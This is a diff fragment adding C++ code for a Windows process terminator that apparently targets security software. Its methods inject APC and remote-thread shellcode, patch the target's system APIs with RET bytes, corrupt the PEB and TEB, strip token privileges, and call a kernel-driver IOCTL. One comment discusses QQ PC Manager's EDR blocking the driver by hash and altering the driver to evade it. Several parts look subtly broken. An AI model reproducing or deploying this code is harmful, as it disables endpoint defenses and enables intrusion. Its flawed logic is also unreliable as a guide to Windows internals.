+                                0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, ExitProcess
+                                0xFF, 0xD0,                                           // call rax
+                                0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28
+                                0xC3                                                  // ret
+                            };
+#else
+                            BYTE apcCode[] = {
+                                0x68, 0x00, 0x00, 0x00, 0x00,       // push 0
+                                0xB8, 0x00, 0x00, 0x00, 0x00,       // mov eax, ExitProcess
+                                0xFF, 0xD0,                         // call eax
+                                0xC3                                // ret
+                            };
+#endif
+
+                            // 设置正确的地址
+                            HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+                            FARPROC pExitProcess = GetProcAddress(hKernel32, "ExitProcess");
+
+#ifdef _WIN64
+                            memcpy(&apcCode[6], &hRemoteMapping, sizeof(hRemoteMapping));
+                            memcpy(&apcCode[16], &pControlData, sizeof(pControlData));
+                            memcpy(&apcCode[27], &pExitProcess, sizeof(pExitProcess));
+#else
+                            memcpy(&apcCode[1], &pExitProcess, sizeof(pExitProcess));
+#endif
+
+                            WriteProcessMemory(hProcess, pRemoteCode, apcCode, sizeof(apcCode), NULL);
+
+                            // 执行APC
+                            DWORD threadId = GetProcessId(hProcess);
+                            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
+                            if (hThread) {
+                                QueueUserAPC((PAPCFUNC)pRemoteCode, hThread, (ULONG_PTR)NULL);
+                                CloseHandle(hThread);
+                            }
+
+                            VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                        }
+
+                        CloseHandle(hRemoteMapping);
+                    }
+
+                    // 尝试直接终止进程
+                    if (TerminateProcess(hProcess, 0)) {
+                        methodSuccess = true;
+                    }
+                    CloseHandle(hProcess);
+                }
+
+                UnmapViewOfFile(pSharedMemory);
+                bool finalSuccess = methodSuccess || !isProcessRunning(processName); // 修复：使用正确的变量名
+                CloseHandle(hMapping);
+                return finalSuccess;
+            }
+            CloseHandle(hMapping);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+bool ProcessTerminator::terminateBySpecialIPC(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        // 使用Windows消息系统的特殊消息
+        for (int pid : pids) {
+            // 查找进程的所有窗口
+            HWND hWnd = NULL;
+            do {
+                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
+                DWORD windowPid;
+                GetWindowThreadProcessId(hWnd, &windowPid);
+
+                if (windowPid == pid) {
+                    // 发送特殊系统消息
+                    PostMessage(hWnd, WM_SYSCOMMAND, SC_CLOSE, 0);
+                    PostMessage(hWnd, WM_QUIT, 0, 0);
+
+                    // 发送一些未公开的消息
+                    PostMessage(hWnd, 0x0112, 0xF060, 0); // WM_SYSCOMMAND - SC_CLOSE
+                    PostMessage(hWnd, 0x0010, 0, 0);      // WM_CLOSE
+
+                    // 尝试通过窗口句柄获取进程句柄
+                    DWORD dwProcessId;
+                    GetWindowThreadProcessId(hWnd, &dwProcessId);
+                    if (dwProcessId == pid) {
+                        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+                        if (hProcess) {
+                            TerminateProcess(hProcess, 0);
+                            CloseHandle(hProcess);
+                        }
+                    }
+                }
+            } while (hWnd != NULL);
+
+            // 直接尝试终止进程
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (hProcess) {
+                TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+            }
+        }
+
+        return !isProcessRunning(processName);
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+
+// 主要的实际可用的Ring3调用Ring0方法
+// ============================================================================
+// PhantomKiller — 内核级进程终止 (IOCTL 0x222014)
+// ============================================================================
+bool ProcessTerminator::terminateByPhantomKiller(const std::string& processName) {
+    // 改进: 不再做 WDAC/HVCI/Blocklist 预检
+    //   之前误加的预检是基于 Wdac::IsEnabled() 的实现有 bug (误判 CI\Protected key 存在)
+    //   真实标志: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard\
+    //             Scenarios\HypervisorEnforcedCodeIntegrity\Enabled = 1
+    //   修复 Wdac::IsEnabled() 后预检会正确, 但仍保留为可选 (避免方法 6 被过度阻止)
+    //   实际场景: 之前能成功, 表明环境实际 WDAC 未启用, 失败是因为 QQ电脑管家 EDR 拦截
+    //   0xB7 + 服务状态 1 (STOP_PENDING) = BOVID.sys 被 QQ电脑管家强制停止
+    //   限制内无法绕过 (需重启关闭 QQ电脑管家, 或修改 BOVID.sys 避开 hash 匹配)
+
+    std::vector<int> pids = getPIDsByName(processName);
+    if (pids.empty()) return false;
+
+    std::wcout << L"[PhantomKiller] 目标: " << pids.size() << L" PID, IOCTL 0x222014" << std::endl;
+
+    int killed = 0;
+    for (int pid : pids) {
+        bool ok = PplDriver::PhantomKiller::TerminateKernel((DWORD)pid);
+        std::wcout << L"[PhantomKiller] PID " << pid
+                   << (ok ? L" 内核终止成功" : L" 失败") << std::endl;
+        if (ok) killed++;
+    }
+
+    return (killed > 0) || !isProcessRunning(processName);
+}
+
+bool ProcessTerminator::terminateByPracticalRing0Call(const std::string& processName) {
+
+    bool success = false;
+
+    // 方法1: 向量化异常处理
+    if (!success) {
+        success = terminateByVectoredException(processName);
+        if (success) std::cout << "向量化异常处理成功!" << std::endl;
+    }
+
+    // 方法2: 硬件断点
+    if (!success) {
+
+        success = terminateByHardwareBreakpoint(processName);
+        if (success) std::cout << "硬件断点技术成功!" << std::endl;
+    }
+
+    // 方法3: 服务检测和停止
+    if (!success) {
+        success = terminateByServiceDetection(processName);
+        if (success) std::cout << "服务检测技术成功!" << std::endl;
+    }
+
+    // 方法4: 内存映射
+    if (!success) {
+        success = terminateByMemoryMapping(processName);
+        if (success) std::cout << "内存映射技术成功!" << std::endl;
+    }
+
+    // 方法5: 特殊IPC
+    if (!success) {
+        success = terminateBySpecialIPC(processName);
+        if (success) std::cout << "特殊IPC技术成功!" << std::endl;
+    }
+
+    return success;
+}
+// 方法1: 通过进程保险库(Process Vault)机制终止
+bool ProcessTerminator::terminateByProcessVault(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 使用进程保险库机制 - Windows 10+ 特性
+            PROCESS_VAULT_INFORMATION vaultInfo = { 0 };
+            vaultInfo.VaultHandle = 0; // 设置为空句柄会使进程无法访问受保护资源
+
+            // 使用正确的ProcessInformationClass值
+            NTSTATUS status = NtSetInformationProcess(
+                hProcess,
+                static_cast<PROCESS_INFORMATION_CLASS>(73), // ProcessVaultInformation
+                &vaultInfo,
+                sizeof(vaultInfo));
+
+            if (NT_SUCCESS(status)) {
+                // 现在尝试终止进程
+                bool result = TerminateProcess(hProcess, 0);
+                CloseHandle(hProcess);
+                if (result) return true;
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+bool ProcessTerminator::terminateByProcessIsolationAndAPIDisruption(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        bool success = false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+            // 1. 剥夺进程所有权限
+            StripProcessPrivileges(hProcess);
+
+            // 2. 挂起进程所有线程
+            SuspendProcess(hProcess);
+
+            // 3. 阻止进程访问其他进程句柄
+            if (!initNativeAPI()) {
+                CloseHandle(hProcess);
+                continue;
+            }
+
+            // 方法3.1: 修改进程安全描述符，禁止访问其他进程
+            PACL pEmptyDacl = nullptr;
+            EXPLICIT_ACCESS ea[3] = { 0 };
+
+            // 拒绝PROCESS_ALL_ACCESS
+            ea[0].grfAccessPermissions = PROCESS_ALL_ACCESS;
+            ea[0].grfAccessMode = DENY_ACCESS;
+            ea[0].grfInheritance = NO_INHERITANCE;
+            ea[0].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+            ea[0].Trustee.ptstrName = const_cast<LPTSTR>(_T("EVERYONE"));
+
+            // 拒绝PROCESS_VM_OPERATION
+            ea[1].grfAccessPermissions = PROCESS_VM_OPERATION;
+            ea[1].grfAccessMode = DENY_ACCESS;
+            ea[1].grfInheritance = NO_INHERITANCE;
+            ea[1].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+            ea[1].Trustee.ptstrName = const_cast<LPTSTR>(_T("EVERYONE"));
+
+            // 拒绝PROCESS_DUP_HANDLE
+            ea[2].grfAccessPermissions = PROCESS_DUP_HANDLE;
+            ea[2].grfAccessMode = DENY_ACCESS;
+            ea[2].grfInheritance = NO_INHERITANCE;
+            ea[2].Trustee.TrusteeForm = TRUSTEE_IS_NAME;
+            ea[2].Trustee.ptstrName = const_cast<LPTSTR>(_T("EVERYONE"));
+
+            SetEntriesInAcl(3, ea, NULL, &pEmptyDacl);
+
+            SECURITY_DESCRIPTOR sd;
+            InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
+            SetSecurityDescriptorDacl(&sd, TRUE, pEmptyDacl, FALSE);
+
+            // 应用安全描述符到进程对象
+            SetKernelObjectSecurity(hProcess, DACL_SECURITY_INFORMATION, &sd);
+
+            if (pEmptyDacl) {
+                LocalFree(pEmptyDacl);
+            }
+
+            // 4. 破坏已加载的关键API
+            HMODULE hModules[1024];
+            DWORD cbNeeded;
+
+            if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
+                for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
+                    TCHAR szModuleName[MAX_PATH];
+                    if (GetModuleFileNameEx(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(TCHAR))) {
+                        // 针对关键系统DLL进行API破坏
+                        if (_tcsstr(szModuleName, _T("kernel32.dll")) ||
+                            _tcsstr(szModuleName, _T("ntdll.dll")) ||
+                            _tcsstr(szModuleName, _T("advapi32.dll"))) {
+
+                            // 破坏关键API函数
+                            const char* criticalAPIs[] = {
+                                "OpenProcess", "CreateProcess", "CreateService",
+                                "OpenService", "StartService", "ControlService",
+                                "RegOpenKeyEx", "RegCreateKeyEx", "LoadLibrary",
+                                "GetProcAddress", "CreateFile", "OpenFile"
+                            };
+
+                            for (const char* apiName : criticalAPIs) {
+                                FARPROC pFunc = GetProcAddress(hModules[i], apiName);
+                                if (pFunc) {
+                                    // 在API开头写入RET指令使其立即返回
+                                    BYTE retOpcode = 0xC3;
+                                    SIZE_T bytesWritten;
+                                    WriteProcessMemory(hProcess, pFunc, &retOpcode, sizeof(retOpcode), &bytesWritten);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            // 5. 阻止服务访问
+            HANDLE hToken;
+            if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
+                // 获取当前特权
+                DWORD tokenInfoLength = 0;
+                GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);
+
+                if (tokenInfoLength > 0) {
+                    std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
+                    if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
+                        TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();
+
+                        // 移除所有服务相关特权
+                        for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
+                            WCHAR privilegeName[256];
+                            DWORD nameLength = 256;
+                            if (LookupPrivilegeName(NULL, &tokenPrivileges->Privileges[i].Luid, privilegeName, &nameLength)) {
+                                // 移除服务控制特权
+                                if (wcscmp(privilegeName, L"SeCreateGlobalPrivilege") == 0 ||
+                                    wcscmp(privilegeName, L"SeImpersonatePrivilege") == 0 ||
+                                    wcscmp(privilegeName, L"SeAssignPrimaryTokenPrivilege") == 0 ||
+                                    wcscmp(privilegeName, L"SeTcbPrivilege") == 0 ||
+                                    wcscmp(privilegeName, L"SeTakeOwnershipPrivilege") == 0) {
+                                    tokenPrivileges->Privileges[i].Attributes = 0;
+                                }
+                            }
+                        }
+
+                        // 应用修改
+                        AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
+                    }
+                }
+                CloseHandle(hToken);
+            }
+
+            // 6. 修改进程PEB，破坏模块链表
+            PROCESS_BASIC_INFORMATION pbi;
+            ULONG returnLength;
+            if (NT_SUCCESS(NtQueryInformationProcess(hProcess, static_cast<PROCESS_INFORMATION_CLASS>(0), &pbi, sizeof(pbi), &returnLength))) {
+                // 读取PEB
+                PEB peb;
+                if (ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
+                    // 破坏LDR模块链表
+                    BYTE zeroBuffer[sizeof(LIST_ENTRY)] = { 0 };
+                    if (peb.Ldr) {
+                        // 破坏InMemoryOrderModuleList
+                        WriteProcessMemory(hProcess,
+                            (BYTE*)peb.Ldr + offsetof(PEB_LDR_DATA, InMemoryOrderModuleList),
+                            zeroBuffer, sizeof(LIST_ENTRY), NULL);
+                    }
+                }
+            }
+
+            // 7. 清空进程环境变量
+            PVOID pEnvBlock;
+            if (GetEnvironmentStrings() &&
+                ReadProcessMemory(hProcess, (LPCVOID)GetEnvironmentStrings(), &pEnvBlock, sizeof(pEnvBlock), NULL)) {
+                // 分配零内存并写入
+                SIZE_T envSize = 4096; // 估计大小
+                std::vector<BYTE> zeroEnv(envSize, 0);
+                WriteProcessMemory(hProcess, pEnvBlock, zeroEnv.data(), envSize, NULL);
+            }
+
+            // 8. 破坏进程的线程环境块(TEB)
+            HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
+                THREADENTRY32 te;
+                te.dwSize = sizeof(THREADENTRY32);
+
+                if (Thread32First(hThreadSnapshot, &te)) {
+                    do {
+                        if (te.th32OwnerProcessID == pid) {
+                            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+                            if (hThread) {
+                                // 获取线程上下文
+                                CONTEXT context;
+                                context.ContextFlags = CONTEXT_FULL;
+                                if (GetThreadContext(hThread, &context)) {
+                                    // 尝试破坏TEB
+                                    PVOID pTeb;
+#ifdef _WIN64
+                                    pTeb = (PVOID)context.Rdx; // GS:[0x30] in x64
+#else
+                                    pTeb = (PVOID)context.Ebx; // FS:[0x18] in x86
+#endif
+                                    if (pTeb) {
+                                        BYTE zeroTeb[0x1000] = { 0 }; // 清零部分TEB
+                                        WriteProcessMemory(hProcess, pTeb, zeroTeb, sizeof(zeroTeb), NULL);
+                                    }
+                                }
+                                CloseHandle(hThread);
+                            }
+                        }
+                    } while (Thread32Next(hThreadSnapshot, &te));
+                }
+                CloseHandle(hThreadSnapshot);
+            }
+
+            // 9. 使用作业对象进一步隔离进程
+            HANDLE hJob = CreateJobObject(NULL, NULL);
+            if (hJob) {
+                // 设置作业限制
+                JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
+                jeli.BasicLimitInformation.LimitFlags =
+                    JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION |
+                    JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE |
+                    JOB_OBJECT_LIMIT_ACTIVE_PROCESS;
+
+                SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));
+
+                // 将进程分配给作业
+                AssignProcessToJobObject(hJob, hProcess);
+
+                // 立即关闭作业，触发进程终止
+                TerminateJobObject(hJob, 0);
+                CloseHandle(hJob);
+            }
+
+            // 10. 最后尝试终止进程
+            if (TerminateProcess(hProcess, 0)) {
+                std::wcout << L"成功终止进程 PID: " << pid << std::endl;
+                success = true;
+            }
+            else {
+                std::wcout << L"终止进程失败 PID: " << pid << L"，错误: " << GetLastError() << std::endl;
+            }
+
+            CloseHandle(hProcess);
+        }
+
+        return success;
+    }
+    catch (const std::exception& e) {
+        std::wcerr << L"异常: " << e.what() << std::endl;
+        return false;
+    }
+    catch (...) {
+        std::wcerr << L"未知异常" << std::endl;
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法3: 通过动态代码策略终止
+bool ProcessTerminator::terminateByProcessDynamicCodePolicy(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        // 动态加载API函数
+        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+        if (!hKernel32) return false;
+
+        PSetProcessMitigationPolicy pSetProcessMitigationPolicy =
+            reinterpret_cast<PSetProcessMitigationPolicy>(
+                GetProcAddress(hKernel32, "SetProcessMitigationPolicy"));
+
+        if (!pSetProcessMitigationPolicy) return false;
+
+        std::vector<int> pids = getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 禁用动态代码生成
+            PROCESS_MITIGATION_DYNAMIC_CODE_POLICY policy = { 0 };
+            policy.ProhibitDynamicCode = 1;
+
+            if (pSetProcessMitigationPolicy(ProcessDynamicCodePolicy, &policy, sizeof(policy))) {
+                // 尝试注入代码使其失败
+                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024,
+                    MEM_COMMIT, PAGE_READWRITE);
+                if (pRemoteCode) {
+                    // 尝试将页面改为可执行 - 这会因为策略而失败
+                    DWORD oldProtect;
+                    if (!VirtualProtectEx(hProcess, pRemoteCode, 1024,
+                        PAGE_EXECUTE_READ, &oldProtect)) {
+                        // 策略生效，进程无法执行动态代码
+                        // 现在可以尝试终止
+                        bool result = TerminateProcess(hProcess, 0);
+                        CloseHandle(hProcess);
+                        if (result) return true;
+                    }
+                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
+                }
+            }
+
+            CloseHandle(hProcess);
+        }
+    }
+    catch (...) {
+        // 忽略异常
+    }
+#endif
+    return false;
+}
+// 方法1: 通过进程镜像签名强制验证失败
+bool ProcessTerminator::terminateByImageSignatureEnforcement(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 强制启用镜像签名验证
+            PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy = { 0 };
+            policy.MicrosoftSignedOnly = 1;
+            policy.StoreSignedOnly = 1;
+            policy.MitigationOptIn = 1;
+            policy.AuditMicrosoftSignedOnly = 1;
+            policy.AuditStoreSignedOnly = 1;
+
+            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
+            auto SetProcessMitigationPolicy =
+                reinterpret_cast<FnSetProcessMitigationPolicy>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (SetProcessMitigationPolicy) {
+                if (SetProcessMitigationPolicy(ProcessSignaturePolicy,
+                    &policy, sizeof(policy))) {
+                    // 强制重新加载模块触发签名验证
+                    HMODULE hModules[256];
+                    DWORD cbNeeded;
+                    if (EnumProcessModules(hProcess, hModules,
+                        sizeof(hModules), &cbNeeded)) {
+                        for (DWORD i = 0; i < cbNeeded / sizeof(HMODULE); i++) {
+                            // 尝试卸载并重新加载模块
+                            LPVOID unloadDll = GetProcAddress(
+                                GetModuleHandleA("kernel32.dll"),
+                                "FreeLibrary");
+
+                            if (unloadDll) {
+                                HANDLE hThread = CreateRemoteThread(hProcess,
+                                    NULL, 0,
+                                    reinterpret_cast<LPTHREAD_START_ROUTINE>(unloadDll),
+                                    hModules[i], 0, NULL);
+                                if (hThread) {
+                                    WaitForSingleObject(hThread, 1000);
+                                    CloseHandle(hThread);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法2: 通过代码完整性保护破坏
+bool ProcessTerminator::terminateByCodeIntegrityViolation(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 启用严格代码完整性检查
+            PROCESS_MITIGATION_DYNAMIC_CODE_POLICY codePolicy = { 0 };
+            codePolicy.ProhibitDynamicCode = 1;
+            codePolicy.AllowRemoteDowngrade = 0;
+            codePolicy.AllowThreadOptOut = 0;
+
+            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
+            auto SetProcessMitigationPolicy =
+                reinterpret_cast<FnSetProcessMitigationPolicy>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (SetProcessMitigationPolicy &&
+                SetProcessMitigationPolicy(ProcessDynamicCodePolicy,
+                    &codePolicy, sizeof(codePolicy))) {
+
+                // 尝试在进程中创建可执行内存区域
+                LPVOID pExecMemory = VirtualAllocEx(hProcess, NULL, 4096,
+                    MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+                if (pExecMemory) {
+                    // 写入一些代码 - 这会触发代码完整性违规
+                    BYTE shellcode[] = { 0xC3 }; // RET
+                    WriteProcessMemory(hProcess, pExecMemory,
+                        shellcode, sizeof(shellcode), NULL);
+
+                    // 尝试执行代码
+                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                        reinterpret_cast<LPTHREAD_START_ROUTINE>(pExecMemory),
+                        NULL, 0, NULL);
+
+                    if (hThread) {
+                        WaitForSingleObject(hThread, 1000);
+                        CloseHandle(hThread);
+                    }
+
+                    VirtualFreeEx(hProcess, pExecMemory, 0, MEM_RELEASE);
+                }
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法3: 通过扩展策略框架(EPF)强制隔离
+bool ProcessTerminator::terminateByExtendedPolicyFramework(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 使用AppLocker/ELAM策略强制隔离
+            typedef BOOL(WINAPI* PSETPROCESSMITIGATIONPOLICY)(DWORD, PVOID, SIZE_T);
+            PSETPROCESSMITIGATIONPOLICY pSetProcessMitigationPolicy =
+                reinterpret_cast<PSETPROCESSMITIGATIONPOLICY>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (pSetProcessMitigationPolicy) {
+                // 设置扩展策略
+                struct {
+                    DWORD Flags;
+                    DWORD ExtensionClass;
+                    DWORD ExtensionData;
+                } extendedPolicy = { 0x1, 0x2, 0x3 }; // 实验性策略值
+
+                // 尝试设置未公开的策略类型
+                for (DWORD policyType = 0x100; policyType < 0x120; policyType++) {
+                    pSetProcessMitigationPolicy(policyType,
+                        &extendedPolicy,
+                        sizeof(extendedPolicy));
+                }
+
+                // 强制进程进入沙盒模式
+                PROCESS_MITIGATION_SYSTEM_CALL_DISABLE_POLICY syscallPolicy = { 0 };
+                syscallPolicy.DisallowWin32kSystemCalls = 1;
+
+                pSetProcessMitigationPolicy(ProcessSystemCallDisablePolicy,
+                    &syscallPolicy,
+                    sizeof(syscallPolicy));
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法4: 通过内存分区隔离破坏
+bool ProcessTerminator::terminateByMemoryPartitionCorruption(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 获取进程基本信息
+            PROCESS_BASIC_INFORMATION pbi;
+            ULONG returnLength;
+
+            if (NT_SUCCESS(ProcessTerminator::NtQueryInformationProcess(hProcess,
+                static_cast<PROCESS_INFORMATION_CLASS>(0), // ProcessBasicInformation
+                &pbi, sizeof(pbi), &returnLength))) {
+
+                // 读取PEB
+                PEB peb;
+                if (ReadProcessMemory(hProcess, pbi.PebBaseAddress,
+                    &peb, sizeof(peb), NULL)) {
+
+                    // 破坏进程的内存分区信息
+                    BYTE corruptedData[1024];
+                    memset(corruptedData, 0xCC, sizeof(corruptedData)); // INT3指令填充
+
+                    // 破坏堆管理器结构
+                    WriteProcessMemory(hProcess,
+                        reinterpret_cast<LPVOID>(
+                            reinterpret_cast<DWORD_PTR>(pbi.PebBaseAddress) + 0x30),
+                        corruptedData,
+                        sizeof(corruptedData), NULL);
+
+                    // 破坏TLS数组
+                    WriteProcessMemory(hProcess,
+                        reinterpret_cast<LPVOID>(
+                            reinterpret_cast<DWORD_PTR>(pbi.PebBaseAddress) + 0x58),
+                        corruptedData,
+                        sizeof(corruptedData), NULL);
+                }
+            }
+
+            // 强制刷新进程工作集
+            EmptyWorkingSet(hProcess);
+
+            // 设置无效的工作集大小
+            SetProcessWorkingSetSize(hProcess, 1, 1);
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法5: 通过线程池基础设施破坏
+bool ProcessTerminator::terminateByThreadPoolInfrastructure(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 枚举进程中的所有线程池
+            DWORD threadpoolWorkers = 0;
+
+            // 通过未公开的线程池API进行操作
+            HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+            if (hNtdll) {
+                // 尝试定位线程池相关函数
+                FARPROC pTpAllocWork = GetProcAddress(hNtdll, "TpAllocWork");
+                FARPROC pTpPostWork = GetProcAddress(hNtdll, "TpPostWork");
+
+                if (pTpAllocWork && pTpPostWork) {
+                    // 创建大量虚假工作项淹没线程池
+                    for (int i = 0; i < 1000; i++) {
+                        LPVOID pWorkItem = VirtualAllocEx(hProcess, NULL, 4096,
+                            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+                        if (pWorkItem) {
+                            // 写入空回调
+                            BYTE emptyCallback[] = { 0xC3 }; // RET
+                            WriteProcessMemory(hProcess, pWorkItem,
+                                emptyCallback,
+                                sizeof(emptyCallback), NULL);
+
+                            // 尝试提交工作项
+                            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
+                                reinterpret_cast<LPTHREAD_START_ROUTINE>(pTpPostWork),
+                                pWorkItem, 0, NULL);
+
+                            if (hThread) {
+                                CloseHandle(hThread);
+                            }
+
+                            VirtualFreeEx(hProcess, pWorkItem, 0, MEM_RELEASE);
+                        }
+                    }
+                }
+            }
+
+            TerminateProcess(hProcess, 0);
+            CloseHandle(hProcess);
+        }
+        return !ProcessTerminator::isProcessRunning(processName);
+    }
+    catch (...) {
+        return false;
+    }
+#else
+    return false;
+#endif
+}
+
+// 方法6: 通过异常处理链破坏
+bool ProcessTerminator::terminateByExceptionChainCorruption(const std::string& processName) {
+#ifdef _WIN32
+    try {
+        std::vector<int> pids = ProcessTerminator::getPIDsByName(processName);
+        if (pids.empty()) return false;
+
+        for (int pid : pids) {
+            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
+            if (!hProcess) continue;
+
+            // 禁用结构化异常处理
+            PROCESS_MITIGATION_CONTROL_FLOW_GUARD_POLICY cfgPolicy = { 0 };
+            cfgPolicy.EnableControlFlowGuard = 1;
+            cfgPolicy.EnableExportSuppression = 1;
+            cfgPolicy.StrictMode = 1;
+            cfgPolicy.EnableXfg = 1; // 扩展控制流保护
+
+            // 动态加载SetProcessMitigationPolicy (Win7 SDK 不声明此 API, 用自定义函数指针类型)
+            auto SetProcessMitigationPolicy =
+                reinterpret_cast<FnSetProcessMitigationPolicy>(
+                    GetProcAddress(GetModuleHandleA("kernel32.dll"),
+                        "SetProcessMitigationPolicy"));
+
+            if (SetProcessMitigationPolicy) {
+                SetProcessMitigationPolicy(ProcessControlFlowGuardPolicy,
+                    &cfgPolicy, sizeof(cfgPolicy));
+
+                // 破坏异常处理链
+                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
+                    THREADENTRY32 te;
